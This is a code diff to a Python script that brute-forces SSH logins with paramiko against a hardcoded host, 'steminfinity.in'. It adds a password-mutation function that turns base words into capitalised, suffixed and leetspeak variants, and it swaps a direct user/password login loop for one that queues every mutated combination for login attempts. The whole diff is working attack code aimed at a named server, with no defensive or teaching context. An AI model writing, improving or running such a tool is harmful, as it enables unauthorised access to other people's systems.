@@ -36,6 +36,29 @@ def check_ssh(ip="steminfinity.in", port=22, timeout=3):
 
 check_ssh()
 
+def smart_mutate(base_word):
+    leet_map = {'a': '@', 'i': '1', 'e': '3', 'o': '0', 's': '$'}
+
+    mutations = set()
+
+    # Basic variations
+    mutations.add(base_word)
+    mutations.add(base_word.capitalize())
+    mutations.add(base_word.upper())
+
+    # Common suffixes
+    suffixes = ["123", "!", "2024", "@"]
+    for word in list(mutations):
+        for suffix in suffixes:
+            mutations.add(word + suffix)
+
+    # Leetspeak (simple version)
+    for word in list(mutations):
+        for orig, repl in leet_map.items():
+            if orig in word:
+                mutations.add(word.replace(orig, repl))
+
+    return mutations
 
 
 def userb(user):
@@ -60,7 +83,7 @@ client = paramiko.SSHClient()
 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
 
-for userc in users:
+'''for userc in users:
     for password in passwords:
 
         try:
@@ -70,6 +93,14 @@ for userc in users:
 
         except Exception as e:
             print(f"Connection Failed with {host}")
+
+'''
+
+
+for userc in users:
+    for base in passwords:
+        for password in smart_mutate(base):
+            combo_queue.put((userc, password))
 
 
 
